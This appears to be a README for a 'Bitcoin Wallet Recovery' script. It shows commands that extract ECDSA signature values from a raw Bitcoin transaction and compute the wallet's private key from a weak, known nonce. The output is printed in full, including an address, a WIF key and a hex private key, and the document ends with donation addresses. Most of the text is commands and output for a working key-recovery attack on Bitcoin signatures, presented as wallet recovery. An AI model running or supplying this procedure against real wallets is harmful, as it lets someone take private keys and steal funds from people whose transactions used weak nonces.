# Bitcoin Wallet Recovery

---

* Tutorial: https://youtu.be/xBgjWE5tA7Y
* Tutorial: https://cryptodeep.ru/shortest-ecdsa-signature

---

# Commands:

    git clone https://github.com/demining/CryptoDeepTools.git

    cd CryptoDeepTools/09BitcoinWalletRecovery/

    ls

    pip2 install -r requirements.txt

   
    python2 breakECDSA.py 0100000001afddd5c9f05bd937b24a761606581c0cddd6696e05a25871279f75b7f6cf891f250000005f3c303902153b78ce563f89a0ed9414f5aa28ad0d96d6795f9c6302200a963d693c008f0f8016cfc7861c7f5d8c4e11e11725f8be747bb77d8755f1b8012103151033d660dc0ef657f379065cab49932ce4fb626d92e50d4194e026328af853ffffffff010000000000000000016a00000000 > signatures.txt
    
    cat signatures.txt

---
 
###   R = 0x00000000000000000000003b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63
###   S = 0x0a963d693c008f0f8016cfc7861c7f5d8c4e11e11725f8be747bb77d8755f1b8
###   Z = 0x521a65420faa5386d91b8afcfab68defa02283240b25aeee958b20b36ddcb6de    

---

###   0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0 --> 0x3b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63, 0x3f3979bf72ae8202983dc989aec7f2ff2ed91bdd69ce02fc0700ca100e59ddf3

---

#   Signatures:

---

    cat Privkey.txt
    
###   K = 0x7fffffffffffffffffffffffffffffff5d576e7357a4501ddfe92f46681b20a0
###   R = 0x00000000000000000000003b78ce563f89a0ed9414f5aa28ad0d96d6795f9c63
###   S = 0x0a963d693c008f0f8016cfc7861c7f5d8c4e11e11725f8be747bb77d8755f1b8
###   Z = 0x521a65420faa5386d91b8afcfab68defa02283240b25aeee958b20b36ddcb6de

---

    python3 calculate.py

---

# PRIVATE KEY:

---

###   ADDR: 15HvLBX9auG2bJdLCTxSvjvWvdgsW7BvAT
###   WIF:  L3LxjEnwKQMFYNYmCGzM1TqnwxRDi8UyRzQpVfmDvk96fYN44oFG
###   HEX:  b6c1238de89e9defea3ea0712e08726e338928ac657c3409ebb93d9a0873797f 


---

# Private key found!
# Bitcoin wallet restored!

---

* Tutorial: https://youtu.be/xBgjWE5tA7Y
* Tutorial: https://cryptodeep.ru/shortest-ecdsa-signature

---







|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |
